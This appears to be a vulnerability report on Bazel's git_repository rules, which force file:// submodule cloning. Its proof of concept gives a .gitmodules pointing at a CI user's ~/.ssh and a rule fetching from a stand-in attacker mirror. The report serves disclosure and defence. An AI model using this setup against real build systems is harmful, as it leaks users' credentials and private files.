### Title
Bazel's `git_repository`/`new_git_repository` force `protocol.file.allow=always` for submodule updates, allowing attacker-controlled `.gitmodules` to read arbitrary local files into the build - ([File: tools/build_defs/repo/git_worker.bzl])

### Summary
`git_repository`/`new_git_repository` clone attacker-influenced content whenever `init_submodules`/`recursive_init_submodules` is set and the fetched tree is not fully integrity-pinned (or is fully attacker controlled, e.g. a hostile mirror or an untrusted CI branch/fork). `update_submodules` invokes `git submodule update --init [--recursive] --checkout --force` with `-c protocol.file.allow=always` forced on every invocation, unconditionally re-enabling `file://` submodule clones that upstream Git disabled by default (as a direct fix for GHSA-8h2m-hnrm-8fjw / CVE-2022-39253, "arbitrary local file/dir read via submodule url"). Because Bazel supplies this override globally, `.gitmodules` content controlled by whoever wrote the fetched commit can point a submodule at an arbitrary local path on the machine running Bazel, causing that local directory's Git history/contents to be cloned into the external repository directory, i.e., data from outside the repo/exec root ends up materialized inside a location the build can read from.

### Finding Description
`git_repo()` in `tools/build_defs/repo/git_worker.bzl` clones a Git repository into the external repository directory and optionally recurses into submodules: [1](#0-0) 

The actual submodule fetch always passes `-c protocol.file.allow=always` to `git submodule update`: [2](#0-1) 

The comment explains the intent was only to permit *local test repos* to be cloned via submodules ("necessary for Git 2.38.1 and associated backport versions", referencing bazelbuild/bazel#17040), but the flag is applied unconditionally to every `git_repository`/`new_git_repository` invocation, not scoped to test fixtures or local paths only: [2](#0-1) 

Git's own fix for CVE-2022-39253 made `protocol.file.allow` default to disabled for automated recursive operations precisely because a repository's `.gitmodules` file (fully controlled by whoever authored the commit being cloned) can declare a submodule URL of `file:///arbitrary/local/path`, causing `git submodule update` to silently clone that local path's contents into the submodule directory. Bazel's `-c protocol.file.allow=always` override globally reverts this hardening for every `git_repository` fetch that uses `init_submodules`/`recursive_init_submodules`, regardless of whether the remote content is trusted.

The attacker model that matches this analog is: an "outsider who publishes or serves content a victim's build consumes" — e.g. a hostile mirror serving a `branch`/`tag` ref (where no `commit` hash pins the content, so Git's content-hash guarantee provides no protection against a malicious server serving different content under the same ref), or an untrusted CI job that builds a fork/PR branch referenced by `git_repository(remote=...)`. In either case the `.gitmodules` tree entry is attacker-authored data that flows unmodified into `git submodule update -c protocol.file.allow=always`, and no containment check exists on submodule URLs before that command runs (unlike the `strip_prefix` escaping checks that do exist elsewhere in the same file for the top-level checkout): [3](#0-2) 

### Impact Explanation
A successful submodule `file://` clone lets attacker-provided `.gitmodules` content pull an arbitrary local directory on the build host (anything readable by the Bazel/CI user — other checked-out repos, credentials files under the user's home directory, cache directories, etc.) into the fetched external repository's submodule path. That materialized content becomes part of the external repository tree, which is then readable through `BUILD` targets, `genrule`s, or other build actions of the invoking workspace — a concrete read of data from outside the intended repository/exec-root boundary into the build graph, matching the "read outside the repository / exec root / output base" impact category. Depending on what is exposed at the guessed/known local path (e.g., `.netrc`, other repos' `.git` objects, credential-helper caches), this can escalate to credential or secret disclosure.

### Likelihood Explanation
Requires: (1) `init_submodules = True` or `recursive_init_submodules = True` on a `git_repository`/`new_git_repository` rule, and (2) the attacker controlling the tree content fetched (a hostile mirror serving a `branch`/`tag`-pinned rule, or a CI pipeline that builds an untrusted branch/fork where the `git_repository` remote/commit is itself attacker-supplied, e.g. via a PR-triggered build). Both are realistic, documented Bazel usage patterns (mirrors, branch tracking, and CI-on-PR patterns are common), but the rule author must have enabled submodule init, and the attacker must be able to guess a locally-readable path of interest, so likelihood is moderate rather than trivial.

### Recommendation
Do not force `protocol.file.allow=always` globally for every `git_repository`/`new_git_repository` invocation. Instead, scope the override strictly to cases actually requiring local-path submodules (e.g., only when the top-level `remote` itself is a `file://`/local path, which indicates a test/dev scenario), or drop the override entirely and let users opt in via `patch_cmds`/their own git config if they truly need local submodule support. At minimum, validate/sanitize submodule URLs (reject `file://`, `ext::`, and other non-`http(s)`/`git`/`ssh` schemes) before invoking `git submodule update`, mirroring the containment checks already present for `strip_prefix` in `git.bzl`.

### Proof of Concept
1. Set up an attacker-controlled Git repository (or a CI job building an untrusted PR branch) whose HEAD commit contains a `.gitmodules` file:
   ```
   [submodule "leak"]
       path = leak
       url = file:///home/ci-runner/.ssh
   ```
2. Reference it from a workspace's `MODULE.bazel`/`WORKSPACE`:
   ```python
   git_repository(
       name = "victim_dep",
       remote = "https://attacker-controlled-mirror.example/repo.git",
       branch = "main",       # no commit hash pinning
       init_submodules = True,
   )
   bazel fetch @victim_dep//...
   ```
3. Observe that `git submodule update --init --checkout --force -c protocol.file.allow=always` clones `/home/ci-runner/.ssh` into `external/+git_repository+victim_dep/leak/`, making its contents visible to any target depending on `@victim_dep`.
4. A `src/test/shell/bazel/starlark_git_repository_test.sh`-style shell test can automate this: create a local "attacker" git repo with a `.gitmodules` pointing at `file://$TEST_TMPDIR/secret_dir`, set `init_submodules = True`, run `bazel fetch`, and assert that `secret_dir`'s contents appear under the fetched repository's submodule path — analogous to the existing `test_strip_prefix_errors` containment tests in that file, which currently has no equivalent check for submodule URL containment.
